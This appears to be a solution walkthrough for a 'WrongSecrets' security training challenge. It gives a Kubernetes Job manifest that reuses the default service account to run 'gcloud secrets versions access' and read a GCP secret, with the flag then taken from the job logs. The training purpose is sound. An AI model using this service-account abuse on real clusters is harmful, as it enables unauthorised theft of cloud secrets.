You can solve this challenge by the following steps:

- Create a new job file `job.yaml` with the following content:

```yaml
apiVersion: batch/v1
kind: Job
metadata:
  name: wrongsecret-3
spec:
  template:
    spec:
      serviceAccountName: default
      containers:
        - name: gcloud
          image: gcr.io/google.com/cloudsdktool/cloud-sdk:latest
          command:
            [
              "gcloud",
              "secrets",
              "versions",
              "access",
              "latest",
              "--secret=wrongsecret-3",
            ]
      restartPolicy: Never
```

This job executes the command `gcloud secrets versions access latest --secret=wrongsecret-3`. Since the job can access the same service account as the secret challenge pod, it can access GCP with the same privileges.

- Apply the job with `kubectl apply -f job.yaml`
- Check the job's logs with `kubectl logs job/wrongsecret-3`. This should show you the solution :)
